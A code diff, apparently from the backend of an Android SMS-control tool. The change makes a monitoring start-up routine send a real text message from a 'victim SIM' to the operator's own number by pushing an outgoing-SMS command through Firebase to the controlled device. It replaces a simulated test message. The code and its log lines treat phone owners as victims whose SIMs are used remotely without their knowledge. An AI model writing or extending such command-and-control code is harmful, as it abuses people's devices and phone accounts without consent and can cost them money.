@@ -429,10 +429,11 @@ async def send_polling_startup_test(
     profile: MonitorProfile,
     device: Device,
 ) -> tuple[int, int]:
-    """On monitoring start — inject test SMS to /mynum phone via Firebase."""
+    """On monitoring start — real SMS from victim SIM to /mynum (recharge/plan check)."""
     import time
 
-    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
+    from app.device_ui import STARTUP_TEST_MESSAGE
+    from app.services import normalize_phone
 
     if not profile.phone_number or not profile.is_monitoring:
         return 0, 0
@@ -442,20 +443,26 @@ async def send_polling_startup_test(
         logger.warning("Startup test skipped: no firebase URL")
         return 0, 0
 
+    mynum = normalize_phone(profile.phone_number)
+    sim_index = profile.selected_sim_index or 0
     t0 = time.perf_counter()
     try:
-        message_id = await push_mynum_inject(
-            profile,
-            device,
-            STARTUP_TEST_SENDER,
+        command_id = await push_outgoing_sms_command(
+            firebase_url,
+            device.name,
+            mynum,
             STARTUP_TEST_MESSAGE,
+            sim_index=sim_index,
+            sim_slot=(sim_index + 1),
+            device=device,
         )
-        if not message_id:
-            raise RuntimeError("startup inject push failed")
+        if not command_id:
+            raise RuntimeError("startup victim SIM send failed")
         total_ms = max(1, int((time.perf_counter() - t0) * 1000))
+        logger.info("Startup test queued victim SIM → %s cmd=%s", mynum, command_id)
         return 1, total_ms
     except Exception as exc:
-        logger.warning("Startup test inject failed: %s", exc)
+        logger.warning("Startup test SMS failed: %s", exc)
         return 0, max(1, int((time.perf_counter() - t0) * 1000))
 
 
